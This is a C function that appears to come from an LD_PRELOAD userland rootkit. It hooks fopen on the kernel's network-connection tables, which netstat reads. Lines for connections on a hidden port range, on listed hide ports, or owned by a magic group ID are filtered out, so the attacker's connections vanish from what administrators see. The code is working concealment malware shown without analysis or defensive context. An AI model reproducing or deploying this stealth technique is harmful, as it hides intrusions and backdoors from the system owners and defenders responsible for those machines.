
FILE * netstat (const char *filename) {
  char line[LINE_MAX];
  unsigned long rxq, txq, time_len, retr, inode;
  int local_port, rem_port, d, state, uid, timer_run, timeout;
  char rem_addr[128], local_addr[128], more[512];
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_fopen) old_fopen = dlsym (libc, "fopen");
  FILE *tmp = tmpfile ();
  FILE *pnt = old_fopen (filename, "r");
  if(tmp == NULL) return pnt; // fuuuuckkkk.... i guess this is better than CRASHING
  while (fgets (line, LINE_MAX, pnt) != NULL) {
    sscanf (line,
            "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n",
            &d, local_addr, &local_port, rem_addr, &rem_port, &state,
            &txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout,
            &inode, more);
    if (!((rem_port >= LOW_PORT && rem_port <= HIGH_PORT) || is_hideport(rem_port) || uid == MAGIC_GID)) {
      if (!(is_hideport(local_port) || (local_port >= LOW_PORT && local_port <= HIGH_PORT))) fputs(line,tmp);
    }
  }
  fclose (pnt);
  if(tmp != NULL) fseek (tmp, 0, SEEK_SET);
  return tmp;
}
